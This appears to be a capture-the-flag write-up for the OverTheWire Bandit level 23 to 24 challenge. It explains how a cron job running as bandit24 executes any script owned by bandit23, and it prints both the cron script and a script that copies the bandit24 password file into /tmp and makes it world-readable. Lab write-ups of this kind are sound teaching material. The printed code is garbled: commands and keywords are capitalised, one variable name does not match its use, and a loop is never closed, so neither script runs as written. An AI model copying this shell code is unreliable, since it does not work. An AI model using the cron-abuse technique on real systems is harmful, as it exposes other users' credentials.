**Bandit Level 23 → Level 24 Explanation**

In this level, I first checked the cron configuration in `/etc/cron.d` to identify the script that was executed automatically.
The cron job runs every minute as **bandit24** and executes `/usr/bin/cronjob_bandit24.sh`. This script looks for files
Owned by **bandit23** in`/var/spool/bandit24/foo`, executes them with **bandit24's** privileges, and then deletes them.

To solve the challenge, I created my own Bash script that copied the contents of `/etc/bandit_pass/bandit24`
To a readable file in `/tmp`. Since the cron job executed my script as **bandit24**, it had permission to read the password file.
After the script ran, I read the output file in `/tmp` to obtain the password for the next level.

**Key takeaway:** A script runs with the permissions of the user who executes it, not the user who created it.

There script

#!/bin/bash

Shopt -s nullglob

Myname=$(whoami)

Cd /var/spool/"$myname"/foo || exit
Echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
For i in * .*;
Do
If [ "$i" != "." ] && [ "$i" != ".." ];
Then
Echo "Handling $i"
Owner="$(stat --format "%U" "./$i")"
If [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
Timeout -s 9 60 "./$i"
Fi
Rm -rf "./$i"
Fi

My script

#!/bin/bash

# Copy the Bandit24 password to a file we own
Cat /etc/bandit_pass/bandit24 > /tmp/bandit24_password

# Make sure we can read it afterwards
Chmod 644 /tmp/bandit24_password
